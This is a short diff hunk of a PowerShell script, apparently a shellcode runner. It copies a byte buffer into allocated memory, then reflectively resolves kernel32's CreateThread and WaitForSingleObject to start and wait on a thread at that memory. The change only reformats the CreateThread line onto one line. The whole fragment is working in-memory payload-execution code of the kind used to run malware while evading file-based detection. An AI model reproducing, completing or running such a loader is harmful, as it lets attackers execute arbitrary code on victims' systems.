@@ -43,8 +43,6 @@ $memSetup = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoin
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $memSetup, $buf.length)
 
-$threadSetup =
-
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll CreateThread), (getDelType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$memSetup,[IntPtr]::Zero,0,[IntPtr]::Zero)
+$threadSetup = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll CreateThread), (getDelType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$memSetup,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll WaitForSingleObject), (getDelType @([IntPtr], [Int32]) ([Int]))).Invoke($threadSetup, 0xFFFFFFFF)
